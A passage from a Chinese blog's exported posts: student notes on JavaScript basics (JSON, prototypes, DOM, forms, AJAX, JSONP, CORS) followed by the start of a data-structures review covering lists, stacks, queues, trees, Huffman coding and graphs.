/^[0-9a-zA-Z\\.]+\\@[0-9a-zA-Z]+\\.(com|org)$/;hould_pass = ['someone@gmail.com', 'bill.gates@microsoft.com', 'tom@voyager.org', 'bob2015@163.com'], should_fail = ['test#gmail.com', 'bill@microsoft', 'bill%gates@ms.com', '@voyager.org'];//验证并提取出带名字的Email地址var re = /^\\&lt;(\\w+\\s+\\w+)\\&gt; (\\w+\\.*\\@\\w+\\.+\\w+)$/;shoule_pass = '&lt;Tom Paris&gt; tom@voyager.org'; 写正则首先要注意转义如：\\s ,\\w,\\d 大小写用i标志 JSON number：和JavaScript的number完全一致； boolean：就是JavaScript的true或false； string：就是JavaScript的string； null：就是JavaScript的null； array：就是JavaScript的Array表示方式——[]； object：就是JavaScript的{ ... }表示方式。 为了统一解析，JSON的字符串规定必须用双引号&quot;&quot;，Object的键也必须用双引号&quot;&quot;。 序列化123456789101112131415var xiaoming = &#123; name: 'xiaoming', age: 14, height: 165&#125;var s = JSON.stringify(xiaoming);console.log(s); //&#123;\"name\":\"xiaoming\",\"age\":14,\"height\":165&#125;var s = JSON.stringify(xiaoming,null,' '); console.log(s); //\"&#123; \"name\": \"xiaoming\", \"age\": 14, \"height\": 165&#125;\"//stringify(a,b,c)//a为对象名，b为指定的属性或者为一个函数，如['age','name'],c为' '代表逐行输出 反序列化拿到一个JSON格式的字符串，我们直接用JSON.parse()把它变成一个JavaScript对象。 JSON.parse()还可以接收一个函数，用来转换解析出的属性。 123456JSON.parse('&#123;\"name\":\"小明\",\"age\":14&#125;'); // Object &#123;name: '小明', age: 14&#125;//接受函数var obj = JSON.parse('&#123;\"name\":\"小明\",\"age\":14&#125;',function(key,value)&#123; if (key ==='name')&#123;return value + '同学'&#125; else return value;&#125;); 面向对象编程在js中没有类的概念，所有的对象都是实例，继承关系不过是把一个对象的原型指向另一个对象而已。 1234567891011121314151617181920&#x2F;&#x2F; 原型对象:var Student &#x3D; &#123; name: &#39;Robot&#39;, height: 1.2, run: function () &#123; console.log(this.name + &#39; is running...&#39;); &#125;&#125;;function createStudent(name) &#123; &#x2F;&#x2F; 基于Student原型创建一个新对象: var s &#x3D; Object.create(Student); &#x2F;&#x2F; 初始化新对象: s.name &#x3D; name; return s;&#125;var xiaoming &#x3D; createStudent(&#39;小明&#39;);xiaoming.run(); &#x2F;&#x2F; 小明 is running...xiaoming.__proto__ &#x3D;&#x3D;&#x3D; Student; &#x2F;&#x2F; true 创建对象JavaScript对每个创建的对象都会设置一个原型，指向它的原型对象。 当我们用obj.xxx访问一个对象的属性时，JavaScript引擎先在当前对象上查找该属性，如果没有找到，就到其原型对象上找，如果还没有找到，就一直上溯到Object.prototype对象，最后，如果还没有找到，就只能返回undefined。 构造函数 除了直接用{ ... }创建一个对象外，JavaScript还可以用一种构造函数的方法来创建对象。它的用法是，先定义一个构造函数： 1234567function Student(name) &#123; this.name &#x3D; name; this.hello &#x3D; function () &#123; alert(&#39;Hello, &#39; + this.name + &#39;!&#39;); &#125;&#125;var xiaoming &#x3D; new Student(&#39;xiaoming&#39;) 写了new，它就变成了一个构造函数，它绑定的this指向新创建的对象，并默认返回this，也就是说，不需要在最后写return this; 原型链： 1234567891011&#x2F;&#x2F;常用创建对象function Student(props)&#123; this.name &#x3D; props.name; this.grade &#x3D; props.grade;&#125;Student.prototype.hello &#x3D; function()&#123; alert(&#39;hello&#39;+this.name+&#39;.&#39;);&#125;function createStudent(props)&#123; return new Student(props);&#125; 要让创建的对象共享一个hello函数，根据对象的属性查找原则，我们只要把hello函数移动到xiaoming、xiaohong这些对象共同的原型上就可以了，也就是Student.prototype 原型继承12345678910111213function Student(props) &#123; this.name = props.name || 'Unnamed';&#125;Student.prototype.hello = function () &#123; alert('Hello, ' + this.name + '!');&#125;function PrimaryStudent(props) &#123; // 调用Student构造函数，绑定this变量: Student.call(this, props); this.grade = props.grade || 1;&#125;new PrimaryStudent() ----&gt; PrimaryStudent.prototype ----&gt; Object.prototype ----&gt; null 理解新的原型链 class继承class创建对象 1234567891011class Student &#123; constructor(name) &#123; this.name = name; &#125; hello() &#123; alert('Hello, ' + this.name + '!'); &#125;&#125;var xiaoming = new Student('xiaoming');xiaoming.hello(); class继承 直接通过extends实现 12345678910class PrimaryStudent extends Student &#123; constructor(name, grade) &#123; super(name); // 记得用super调用父类的构造方法! this.grade = grade; &#125; myGrade() &#123; alert('I am at grade ' + this.grade); &#125;&#125; 需要通过super(name)来调用父类的构造函数，否则父类的name属性无法正常初始化。 浏览器浏览器对象window window对象不但充当全局作用域，而且表示浏览器窗口。 innerWidth innerHeight可以获取浏览器窗口的内部高度和宽度 outerWidth outerHeight获取浏览器窗口的整个宽高 navigator navigator对象表示浏览器的信息，最常用的属性包括： navigator.appName：浏览器名称； navigator.appVersion：浏览器版本； navigator.language：浏览器设置的语言； navigator.platform：操作系统类型； navigator.userAgent：浏览器设定的User-Agent字符串。 screenscreen对象表示屏幕的信息，常用的属性有： screen.width：屏幕宽度，以像素为单位； screen.height：屏幕高度，以像素为单位； screen.colorDepth：返回颜色位数，如8、16、24。 locationlocation对象表示当前页面的URL信息。 123456789location.href &#x2F;&#x2F;urllocation.protocol; &#x2F;&#x2F; &#39;http&#39;location.host; &#x2F;&#x2F; &#39;www.example.com&#39;location.port; &#x2F;&#x2F; &#39;8080&#39;location.pathname; &#x2F;&#x2F; &#39;&#x2F;path&#x2F;index.html&#39;location.search; &#x2F;&#x2F; &#39;?a&#x3D;1&amp;b&#x3D;2&#39;location.hash; &#x2F;&#x2F; &#39;TOP&#39;location.assign(&#39;...&#39;) &#x2F;&#x2F;加载一个新的页面location.reload() &#x2F;&#x2F;重新加载当前页面 documentdocument对象表示当前页面。由于HTML在浏览器中以DOM形式表示为树形结构，document对象就是整个DOM树的根节点。 用document对象提供的getElementById()和getElementsByTagName()可以按ID获得一个DOM节点和按Tag名称获得一组DOM节点 document对象还有一个cookie属性，可以获取当前页面的Cookie。JavaScript可以通过document.cookie读取到当前页面的Cookie。 historyhistory对象保存了浏览器的历史记录，JavaScript可以调用history对象的back()或forward ()，相当于用户点击了浏览器的“后退”或“前进”按钮。但现在不使用。 操作DOM由于HTML文档被浏览器解析后就是一棵DOM树，要改变HTML的结构，就需要通过JavaScript来操作DOM。 始终记住DOM是一个树形结构。操作一个DOM节点实际上就是这么几个操作： 更新：更新该DOM节点的内容，相当于更新了该DOM节点表示的HTML的内容； 遍历：遍历该DOM节点下的子节点，以便进行进一步操作； 添加：在该DOM节点下新增一个子节点，相当于动态增加了一个HTML节点； 删除：将该节点从HTML中删除，相当于删掉了该DOM节点的内容以及它包含的所有子节点。 在操作一个DOM节点前，我们需要通过各种方式先拿到这个DOM节点。最常用的方法是document.getElementById()和document.getElementsByTagName()，以及CSS选择器document.getElementsByClassName()。 12345document.getElementById(&#39;test&#39;); &#x2F;&#x2F; 返回ID为&#39;test&#39;的节点：ocument.getElementById(&#39;test-table&#39;).getElementsByTagName(&#39;tr&#39;); &#x2F;&#x2F; 先定位ID为&#39;test-table&#39;的节点，再返回其内部所有tr节点：document.getElementById(&#39;test-div&#39;).getElementsByClassName(&#39;red&#39;); &#x2F;&#x2F; 先定位ID为&#39;test-div&#39;的节点，再返回其内部所有class包含red的节点：test.firstElementChild &#x2F;&#x2F;test下第一个结点test.lastElementChild &#x2F;&#x2F;test下最后一个结点 第二种方法是使用querySelector()和querySelectorAll()，需要了解selector语法，然后使用条件来获取节点，更加方便。 作业 12345678910111213141516171819202122232425&lt;!-- HTML结构 --&gt;&lt;div id=\"test-div\"&gt;&lt;div class=\"c-red\"&gt; &lt;p id=\"test-p\"&gt;JavaScript&lt;/p&gt; &lt;p&gt;Java&lt;/p&gt; &lt;/div&gt; &lt;div class=\"c-red c-green\"&gt; &lt;p&gt;Python&lt;/p&gt; &lt;p&gt;Ruby&lt;/p&gt; &lt;p&gt;Swift&lt;/p&gt; &lt;/div&gt; &lt;div class=\"c-green\"&gt; &lt;p&gt;Scheme&lt;/p&gt; &lt;p&gt;Haskell&lt;/p&gt; &lt;/div&gt;&lt;/div&gt;// 选择&lt;p&gt;JavaScript&lt;/p&gt;:var js = document.getElementById('test-p');// 选择&lt;p&gt;Python&lt;/p&gt;,&lt;p&gt;Ruby&lt;/p&gt;,&lt;p&gt;Swift&lt;/p&gt;:var arr = document.getElementsByClassName('c-red')[1].getElementsByTagName('p');// 选择&lt;p&gt;Haskell&lt;/p&gt;:var haskell = document.getElementsByClassName('c-green')[1].lastElementChild; 更新DOM一种是修改innerHTML属性，这个方式非常强大，不但可以修改一个DOM节点的文本内容，还可以直接通过HTML片段修改DOM节点内部的子树 1234&#x2F;&#x2F;获取&lt;p id &#x3D; &#39;p&#39;&gt;...&lt;&#x2F;p&gt;var p &#x3D; document.getElementById(&#39;p&#39;);p.innerHTML &#x3D; &#39;ABC&#39;&#x2F;&#x2F;&lt;p id &#x3D; &#39;p&#39;&gt;ABC&lt;&#x2F;p&gt; 第二种是修改innerText或textContent属性，这样可以自动对字符串进行HTML编码，保证无法设置任何HTML标签 123456&#x2F;&#x2F; 获取&lt;p id&#x3D;&quot;p-id&quot;&gt;...&lt;&#x2F;p&gt;var p &#x3D; document.getElementById(&#39;p-id&#39;);&#x2F;&#x2F; 设置文本:p.innerText &#x3D; &#39;&lt;script&gt;alert(&quot;Hi&quot;)&lt;&#x2F;script&gt;&#39;;&#x2F;&#x2F; HTML被自动编码，无法设置一个&lt;script&gt;节点:&#x2F;&#x2F; &lt;p id&#x3D;&quot;p-id&quot;&gt;&lt;script&gt;alert(&quot;Hi&quot;)&lt;&#x2F;script&gt;&lt;&#x2F;p&gt; 插入DOM一个是使用appendChild，把一个子节点添加到父节点的最后一个子节点。 12345678910111213&lt;!-- HTML结构 --&gt;&lt;p id=\"js\"&gt;JavaScript&lt;/p&gt;&lt;div id=\"list\"&gt; &lt;p id=\"java\"&gt;Java&lt;/p&gt; &lt;p id=\"python\"&gt;Python&lt;/p&gt; &lt;p id=\"scheme\"&gt;Scheme&lt;/p&gt;&lt;/div&gt;var list = document.getElementById('list');js = document.createElement('p');js.id = 'js';js.innerText = 'javascript';list.appendChild(js); 另一个是insertBefore，可以使用parentElement.insertBefore(newElement, referenceElement); 1234567var list = document.getElementById('list'), ref = document.getElementById('python'), haskell = document.createElement('p');haskell.id = 'haskell';haskell.innerText = 'Haskell';list.insertBefore(haskell, ref); 删除DOM12345678&lt;div id=\"parent\"&gt; &lt;p&gt;First&lt;/p&gt; &lt;p&gt;Second&lt;/p&gt;&lt;/div&gt;var parent = document.getElementById('parent');parent.removeChild(parent.children[0]);parent.removeChild(parent.children[1]); // &lt;-- 浏览器报错 浏览器报错：parent.children[1]不是一个有效的节点。原因就在于，当&lt;p&gt;First&lt;/p&gt;节点被删除后，parent.children的节点数量已经从2变为了1，索引[1]已经不存在了。 操作表单HTML表单的输入控件主要有以下几种： 文本框，对应的&lt;input type=&quot;text&quot;&gt;，用于输入文本； 口令框，对应的&lt;input type=&quot;password&quot;&gt;，用于输入口令； 单选框，对应的&lt;input type=&quot;radio&quot;&gt;，用于选择一项； 复选框，对应的&lt;input type=&quot;checkbox&quot;&gt;，用于选择多项； 下拉框，对应的&lt;select&gt;，用于选择一项； 隐藏文本，对应的&lt;input type=&quot;hidden&quot;&gt;，用户不可见，但表单提交时会把隐藏文本发送到服务器。 获取值12var input &#x3D; document.getElementById(&#39;email&#39;);input.value &#x2F;&#x2F;用户输入的值 设置值12var input &#x3D; document.getElementById(&#39;email&#39;);input.value &#x3D; &#39;test&#39;; &#x2F;&#x2F;文本框内容已被设置 HTML5控件HTML5新增了大量标准控件，常用的包括date、datetime、datetime-local、color等，它们都使用&lt;input&gt;标签。 提交表单方式一是通过&lt;form&gt;元素的submit()方法提交一个表单，例如，响应一个&lt;button&gt;的click事件，在JavaScript代码中提交表单。 1234567891011121314&lt;!-- HTML --&gt;&lt;form id=\"test-form\"&gt; &lt;input type=\"text\" name=\"test\"&gt; &lt;button type=\"button\" onclick=\"doSubmitForm()\"&gt;Submit&lt;/button&gt;&lt;/form&gt;&lt;script&gt;function doSubmitForm() &#123; var form = document.getElementById('test-form'); // 可以在此修改form的input... // 提交form: form.submit();&#125;&lt;/script&gt; 第二种方式是响应&lt;form&gt;本身的onsubmit事件，在提交form时作修改。 1234567891011121314&lt;!-- HTML --&gt;&lt;form id=\"test-form\" onsubmit=\"return checkForm()\"&gt; &lt;input type=\"text\" name=\"test\"&gt; &lt;button type=\"submit\"&gt;Submit&lt;/button&gt;&lt;/form&gt;&lt;script&gt;function checkForm() &#123; var form = document.getElementById('test-form'); // 可以在此修改form的input... // 继续下一步: return true;&#125;&lt;/script&gt; 操作文件在HTML表单中，可以上传文件的唯一控件就是&lt;input type=&quot;file&quot;&gt;。 注意：当一个表单包含&lt;input type=&quot;file&quot;&gt;时，表单的enctype必须指定为multipart/form-data，method必须指定为post，浏览器才能正确编码并以multipart/form-data格式发送表单的数据。 出于安全考虑，浏览器只允许用户点击&lt;input type=&quot;file&quot;&gt;来选择本地文件，用JavaScript对&lt;input type=&quot;file&quot;&gt;的value赋值是没有任何效果的。当用户选择了上传某个文件后，JavaScript也无法获得该文件的真实路径。 *AJAX如果要让用户留在当前页面中，同时发出新的HTTP请求，就必须用JavaScript发送这个新请求，接收到数据后，再用JavaScript更新页面，这样一来，用户就感觉自己仍然停留在当前页面，但是数据却可以不断地更新。 用JavaScript写一个完整的AJAX代码并不复杂，但是需要注意：AJAX请求是异步执行的，也就是说，要通过回调函数获得响应。 当创建了XMLHttpRequest对象后，要先设置onreadystatechange的回调函数。在回调函数中，通常我们只需通过readyState === 4判断请求是否完成，如果已完成，再根据status === 200判断是否是一个成功的响应。 XMLHttpRequest对象的open()方法有3个参数，第一个参数指定是GET还是POST，第二个参数指定URL地址，第三个参数指定是否使用异步，默认是true，所以不用写。 注意，千万不要把第三个参数指定为false，否则浏览器将停止响应，直到AJAX请求完成。如果这个请求耗时10秒，那么10秒内你会发现浏览器处于“假死”状态。 最后调用send()方法才真正发送请求。GET请求不需要参数，POST请求需要把body部分以字符串或者FormData对象传进去。 安全限制 上面代码的URL使用的是相对路径。如果你把它改为&#39;http://www.sina.com.cn/&#39;，再运行，肯定报错。在Chrome的控制台里，还可以看到错误信息。默认情况下，JavaScript在发送AJAX请求时，URL的域名必须和当前页面完全一致。完全一致的意思是，域名要相同（www.example.com和example.com不同），协议要相同（http和https不同），端口号要相同（默认是:80端口，它和:8080就不同）。有的浏览器口子松一点，允许端口不同，大多数浏览器都会严格遵守这个限制。 JS请求外域的URL： 一是通过Flash插件发送HTTP请求，这种方式可以绕过浏览器的安全限制，但必须安装Flash，并且跟Flash交互。不过Flash用起来麻烦，而且现在用得也越来越少了。 二是通过在同源域名下架设一个代理服务器来转发，JavaScript负责把请求发送到代理服务器：代理服务器再把结果返回，这样就遵守了浏览器的同源策略。这种方式麻烦之处在于需要服务器端额外做开发。 第三种方式称为JSONP，它有个限制，只能用GET请求，并且要求返回JavaScript。这种方式跨域实际上是利用了浏览器允许跨域引用JavaScript资源： 123456789&lt;html&gt;&lt;head&gt; &lt;script src&#x3D;&quot;http:&#x2F;&#x2F;example.com&#x2F;abc.js&quot;&gt;&lt;&#x2F;script&gt; ...&lt;&#x2F;head&gt;&lt;body&gt;...&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; JSONP通常以函数调用的形式返回，例如，返回JavaScript内容如下： 1foo(&#39;data&#39;); 这样一来，我们如果在页面中先准备好foo()函数，然后给页面动态加一个&lt;script&gt;节点，相当于动态读取外域的JavaScript资源，最后就等着接收回调了。 以163的股票查询URL为例，对于URL：http://api.money.126.net/data/feed/0000001,1399001?callback=refreshPrice，你将得到如下返回： 1refreshPrice(&#123;&quot;0000001&quot;:&#123;&quot;code&quot;: &quot;0000001&quot;, ... &#125;); 因此我们需要首先在页面中准备好回调函数： 12345678function refreshPrice(data) &#123; var p &#x3D; document.getElementById(&#39;test-jsonp&#39;); p.innerHTML &#x3D; &#39;当前价格：&#39; + data[&#39;0000001&#39;].name +&#39;: &#39; + data[&#39;0000001&#39;].price + &#39;；&#39; + data[&#39;1399001&#39;].name + &#39;: &#39; + data[&#39;1399001&#39;].price;&#125; 当前价格：上证指数: 3310.01；深证成指: 13637.883 刷新 最后用getPrice()函数触发： 1234567function getPrice() &#123; var js &#x3D; document.createElement(&#39;script&#39;), head &#x3D; document.getElementsByTagName(&#39;head&#39;)[0]; js.src &#x3D; &#39;http:&#x2F;&#x2F;api.money.126.net&#x2F;data&#x2F;feed&#x2F;0000001,1399001?callback&#x3D;refreshPrice&#39;; head.appendChild(js);&#125; 就完成了跨域加载数据。 CORS CORS全称Cross-Origin Resource Sharing 本域：Origin，也就是浏览器当前页面的域。 外域：指向的访问网页 当JavaScript向外域发起请求后，浏览器收到响应后，首先检查Access-Control-Allow-Origin是否包含本域，如果是，则此次跨域请求成功，如果不是，则请求失败，JavaScript将无法获取到响应的任何数据。 PromisePromise对象先统一执行AJAX逻辑，不关心如何处理结果，然后，根据结果是成功还是失败，在将来的某个时候调用success函数或fail函数。 对Promise和AJAX理解还不是很深刻，回头继续看。 CanvasCanvas是HTML5新增的组件，它就像一块幕布，可以用JavaScript在上面绘制各种图表、动画等。 1234&lt;!-- HTML代码 --&gt;&lt;canvas id&#x3D;&quot;test-canvas&quot; width&#x3D;&quot;200&quot; heigth&#x3D;&quot;100&quot;&gt; &lt;p&gt;你的浏览器不支持Canvas&lt;&#x2F;p&gt;&lt;&#x2F;canvas&gt; 后面的jQuery，Node.js和React之后再看。","categories":[{"name":"前端","slug":"前端","permalink":"https://pz1o.top/categories/%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"前端","slug":"前端","permalink":"https://pz1o.top/tags/%E5%89%8D%E7%AB%AF/"},{"name":"学习","slug":"学习","permalink":"https://pz1o.top/tags/%E5%AD%A6%E4%B9%A0/"}]},{"title":"数据结构复习","slug":"数据结构复习","date":"2020-06-30T07:45:07.000Z","updated":"2020-11-20T14:20:13.640Z","comments":true,"path":"2020/06/30/数据结构复习/","link":"","permalink":"https://pz1o.top/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/","excerpt":"","text":"数据结构复习根据老师重点，复习数据结构。 线性表循环链表循环链表的产生：在单链表中，（1）只知道一个结点，想知道所有结点是不太行的。（2）如果要找一个结点的直接前驱结点，需要从表端一个一个结点查找，时间开销到达了O（n）。 循环链表的概念将单链表的首尾相连，使终端结点的指针域指向头结点，构成单向循环链表。 循环链表中可以带头指针和尾指针。 头指针： 尾指针： 循环链表的插入 123//具体操作s-&gt;link = p-&gt;link;p-&gt;link = s; 双向链表双向链表的产生：解决单链表中的（2） 双向链表的概念双向链表中的每个结点都有一个前驱指针和一个后继指针和数据域。 1p &#x3D; p-&gt;rlink-&gt;llink &#x3D; p-&gt;llink-&gt;rlink; 双向链表的插入双向链表的插入分为前驱方向的插入和后继方向的插入‘。 后继: 12345&#x2F;&#x2F;具体操作newnode-&gt;rlink &#x3D; current-&gt;rlink;current-&gt;rlink &#x3D; newnode;newnode-&gt;rlink-&gt;llink &#x3D; newnode;newnode-&gt;llink &#x3D; current; 前驱（相当于反向的后继）： 12345&#x2F;&#x2F;具体操作newnode-&gt;llink &#x3D; current-&gt;llink;current-&gt;llink &#x3D; newnode;newnode-&gt;llink-&gt;rlink &#x3D; newnode;newnode-&gt;rlink &#x3D; current; 双向链表的删除 123&#x2F;&#x2F;具体操作current-&gt;rlink-&gt;llink &#x3D; current-&gt;llink;current-&gt;llink-&gt;rlink &#x3D; current-&gt;rlink; 栈栈的定义 只允许在一端插入和删除的线性表。（后进先出） 栈顶：允许插入和删除的一端。 栈底：不允许插入和删除的一端。 顺序栈 栈顶指针top=maxsize-1，则表示栈满。 列车调度问题 如上图所述，有多少种不同的出栈序列？ 123456F(n)&#x3D;F(0)*F(n-1)+F(1)*F(n-2)+...+F(n-1)*F(n-n)F(0)&#x3D;1F(1)&#x3D;F(0)*F(0)&#x3D;1F(2)&#x3D;F(0)*F(2-1)+F(0)*F(2-2)&#x3D;2F(3)&#x3D;F(0)*F(3-1)+F(1)*F(3-2)+F(2)*F(3-3)&#x3D;5F(4)&#x3D;F(0)*F(4-1)+F(1)*F(4-2)+F(2)*F(4-3)+F(3)*F(4-4)&#x3D;14 在1423序列中，我们观察子序列423，发现2夹在4和3之间，即最大的数先出栈，最小的数中间出栈，中间的数最后出栈——这无论如何不可能出现，因为它违反栈“后进先出”的特点；同样2413序列中1夹在4和3之间，3412序列中1夹在4和2之间，4312序列中1夹在3和2之间，这都违反LOFI规律。 链式栈用单链表来表示栈，为链式栈。 链式栈无栈满问题。 链式栈的栈顶在链头。 插入和删除在栈顶执行。 *括号匹配 *中缀表达式转换成后缀表达式 除左括号和右括号外，同一操作符栈内优先级大于栈外优先级。 若栈外操作符优先级大于栈内操作符，则栈外操作符进栈；否则，出栈。 栈与递归 定义是递归的（斐波那契数列） 数据结构是递归的（树，链表） 问题解法是递归的 汉诺塔问题 用 C 柱做过渡，将 A 柱上的 (n-1) 个盘子移到 B 柱上； 将 A 柱上最后一个盘子直接移到 C 柱上； 用 A 柱做过渡，将 B 柱上的 (n-1) 个盘子移到 C 柱上。 123456789101112131415void Hanoi(int n,char a,char b,char c)&#123; if(n==1)&#123; move(n,A,C); &#125; else&#123; Hanoi(n-1,A,C,B); move(n,A,C); Hanoi(n-1,B,A,C); &#125; &#125;void move(int n,char A,char C)&#123; cout &lt;&lt; \"Move \"&lt;&lt; n &lt;&lt;\"From \"&lt;&lt; A &lt;&lt;\"To \"&lt;&lt; C;&#125; 队列队列的定义： 只允许在一端删除，在另一端插入的线性表。（先进先出） 队头：允许删除的=一端。 队尾：允许插入的一端。 循环队列 队列初始化：=front = rear = 0; 队头指针进1: front = (front+1) % maxSize; 队尾指针进1: rear = (rear+1) % maxSize; 队空条件：front == rear; 队满条件：(rear+1) % maxSize == front ; 循环队列只能存放（maxSize-1）个元素； 循环队列中元素的个数为：(rear-front+maxSize)%maxSize; 链式队列 队头在链头，队尾在链尾。 队空为 front == NULL 数组数组的存储表示： 设第一个数组元素的存储地址为a，每一个数组元素的存储大小为l 在一维数组中：$LOC(i)=a+i*l$ 在二维数组中,按照行优先存储，每一行最多存储元素为m个：$LOC(j,k)=a+(j*m+k)l$ 散列表树树的基本概念结点的层次：根节点在第一层，其他类推。 深度：树中距离根结点最远的结点所在的层次叫做树的深度。 高度：高度与深度数值相等，但方向不同。根节点的高度就叫做树的高度。 结点的度：结点所拥有的子树棵树。 树的度：树中结点的度的最大值。 二叉树二叉树的定义 每个结点最多有两棵子树 左子树和右子树不可颠倒 二叉树的五种形态： 二叉树的性质 二叉树的第i层最多有$2^{i-1}$个结点 深度为k的二叉树最少有k个结点，最多有$2^k-1$个结点 对任何一棵二叉树，如果其叶结点有 n0 个, 度为 2 的非叶结点有 n2 个, 则有n0＝n2＋1 具有 n (n≥0) 个结点的完全二叉树的深度为 $\\lceil log2(n+1)\\rceil$ 如将一棵有n个结点的完全二叉树自顶向下，同一层自左向右连续给结点编号1, 2, …, n，则有以下关系：若i = 1, 则 i 无双亲若i &gt; 1, 则 i 的双亲为$\\lfloor i／2\\rfloor$i 的左子女为 2 i(如果i有左子女的话)， i 的右子女为2 i+1 (如果i有右子女的话)若 i 为奇数, 且i != 1, 则其左兄弟为i-1,若 i 为偶数, 且i != 1, 则其右兄弟为i+1 满二叉树每一层结点都达到了最大个数的二叉树。深度为k的满二叉树有$2^k-1$个。 完全二叉树若设二叉树的深度为 k，则共有 k 层。除第 k 层外，其它各层 (1—k-1) 的结点数都达到最大个数，第k层从右向左连续缺若干结点，这就是完全二叉树。（区分非完全二叉树） 二叉树的存储表示顺序存储完全二叉树 非完全二叉树 问：顺序存储后能否复原成唯一对应的二叉树形状？ 答：若是完全/满二叉树则可以做到唯一复原。 因为根据性质5：可知结点i，左孩子的下标值必为2i， 其右孩子的下标值必为2i＋1. 非完全二叉树要将各层空缺处统统补上“虚结点”，其内容为空。 链表存储二叉树结点定义： 含n个结点的二叉链表其中空指针域为n+1个，非空指针域为n-1个。 二叉树遍历==二叉树的遍历就是按某种次序访问树中的结点，要求每个结点访问一次且仅访问一次。== 二叉树遍历的递归算法对根的访问时机不同，有三种实现方案： 123VLR（前序）LVR（中序）LRV（后序） 前序遍历二叉树 若二叉树为空，则 空操作；否则 (1) 访问根结点； (2) 先序遍历左子树； (3) 先序遍历右子树。 中序遍历二叉树 若二叉树为空， 则空操作；否则 (1) 中序遍历 左子树； (2) 访问根结点； (3) 中序遍历右子树。 后序遍历二叉树 若二叉树为空，则 空操作；否则 (1) 后序遍历 左子树； (2) 后序遍历 右子树； (3) 访问根结点 12345678910//前序遍历void preOrder(BiTree T)&#123; if(T)&#123; cout &lt;&lt; T-&gt;data &lt;&lt; endl; preOrder(T-&gt;lchild); preOrder(T-&gt;rchild); &#125;&#125;//中序和后序看访问的次序 二叉树算法设计练习 1234567891011121314151617181920212223//二叉树算法设计练习//设计算法按前序次序打印二叉树中的叶子结点。void PreOrder(BiNode *root)&#123; if (root == NULL) return; else &#123; if (root-&gt;lchild ==NULL &amp;&amp; root-&gt;rchild==NULL) cout&lt;&lt;root-&gt;data; PreOrder(root-&gt;lchild); PreOrder(root-&gt;rchild); &#125;&#125;//设计算法求二叉树中叶子结点个数int CountLeaf (BiNode * T)&#123;// 先序遍历二叉树，以 count 返回二叉树中叶子结点数 if ( T ==null) return 0; else if ((!T-&gt;Lchild)&amp;&amp; (!T-&gt;Rchild))return 1; else&#123; int a=CountLeaf( T-&gt;Lchild); int b = CountLeaf( T-&gt;Rchild); return a+b; &#125; &#125; 二叉树遍历的非递归算法前序遍历 中序遍历 层次序遍历 1234567891011121314template &lt;class T&gt;void BinaryTree&lt;T&gt;::levelOrder (void (*visit) (BinTreeNode&lt;T&gt; *t)) &#123; if (root == NULL) return; Queue&lt;BinTreeNode&lt;T&gt; * &gt; Q; BinTreeNode&lt;T&gt; *p = root; Q.EnQueue (p); while (!Q.IsEmpty ()) &#123; Q.DeQueue (p); visit(p); if (p-&gt;leftChild != NULL) Q.EnQueue (p-&gt;leftChild); if (p-&gt;rightChild != NULL) Q.EnQueue (p-&gt;rightChild); &#125; &#125;; 二叉树的计数由先序序列确定根结点，再由中序序列找出左右子树，可唯一确定一棵二叉树！ 树和森林树的存储表示：树会转换成二叉树，通常用左子女，右兄弟来表示。 森林和二叉树的转换森林转换为二叉树 将森林中的每棵树转换成二叉树； 从第二棵二叉树开始，依次把后一棵二叉树的根结点作为前一棵二叉树根结点的右孩子，当所有二叉树连起来后，此时所得到的二叉树就是由森林转换得到的二叉树。 树与和森林的遍历深度优先遍历 森林和树一样。 广度优先遍历森林的层次序遍历： 依次遍历各棵树的根节点； 依次遍历各棵树根节点的所有子女； 哈夫曼树路径长度路径长度：两个结点之间的路径长度 PL 是连接两结点的路径上的分支数。 树的路径长度：从树根到每一结点的路径长度之和。 树的带权路径长度：设树具有n个带权值的叶子结点，从根结点到各个叶子结点的路径长度与相应叶子结点权值的乘积之和。 记为： $WPL=\\sum_{k=1}^nW_kL_k$ 哈夫曼树带权路径长度达到最小的扩充二叉树为哈夫曼树。 特点为： 权值越大的叶子结点越靠近根结点，而权值越小的叶子结点越远离根结点。 只有度为0（叶子结点）和度为2（分支结点）的结点，不存在度为1的结点。 若哈夫曼树有n个叶节点，则总结点为2n-1个。 哈夫曼编码哈夫曼编码用哈夫曼编码树来表示（左零右一）。 哈夫曼编码结果：$WPL=1bit7+2bit5+3bit6=35bit$ 基本思想：概率大的字符用短码，概率小的用长码。 练习：假设用于通信的电文仅由8个字母 {a, b, c, d, e, f, g, h} 构成，它们在电文中出现的概率分别为{ 0.07, 0.19, 0.02, 0.06, 0.32, 0.03, 0.21, 0.10}，试为这8个字母设计哈夫曼编码。如果用0～7的二进制编码方案又如何？ 一般左面是小数，右面是大数。 $WPL＝2(0.19+0.32+0.21) + 4(0.07+0.06+0.10) +5(0.02+0.03) =1.44+0.92+0.25=2.61 $ 堆最小堆：任一结点的关键码均小于或等于它的左右子女的关键码，位于堆顶的结点的关键码是集合中最小的，所以称为最小堆。 最小堆的形成 图图的基本概念有向图：图G中的每条边都是有方向的； 无向图：图G中的每条边都是无方向的； 完全图 ：图G任意两个顶点都有一条边相连接；若有 n 个顶点的无向图有 n(n-1)/2 条边, 则此图为完全无向图。有 n 个顶点的有向图有n(n-1) 条边, 则此图为完全有向图。 顶点的度：一个顶点v的度是与它相关联的边的条数。 连通图与连通分量 ：在无向图中, 若从顶点v1到顶点v2有路径, 则称顶点v1与v2是连通的。如果图中任意一对顶点都是连通的, 则称此图是连通图。非连通图的极大连通子图叫做连通分量。 ==这里要分清两个概念：极大连通子图（连通分量）和极小连通子图（生成树）== 极大连通子图 连通图只有一个极大连通子图，就是它本身 非连通图的极大连通子图就叫连通分量，每个分量都是一个连通图。 极小连通子图 一个连通图的生成树就是极小连通子图，并且极小联通子图只存在于连通图中。 最明显的特点是n个结点，n-1条边。 强连通图与强连通分量 ：在有向图中, 若对于每一对顶点vi和vj, 都存在一条从vi到vj和从vj到vi的路径, 则称此图是强连通图。非强连通图的极大强连通子图叫做强连通分量。 生成树 ：一个连通图的生成树是其极小连通子图，在 n 个顶点的情形下，有 n-1 条边。 图的存储结构邻接矩阵表示 特点：完全图的邻接矩阵中，对角元素全为0，其余全为1。 网络的邻接矩阵 邻接矩阵法优点： 容易实现图的操作，如：求某顶点的度、判断顶点之间是否有边（弧）、找顶点的邻接点等等。 邻接矩阵法缺点： n个顶点需要n*n个单元存储边(弧);空间效率为O(n2)。 对稀疏图而言尤其浪费空间。 邻接表表示 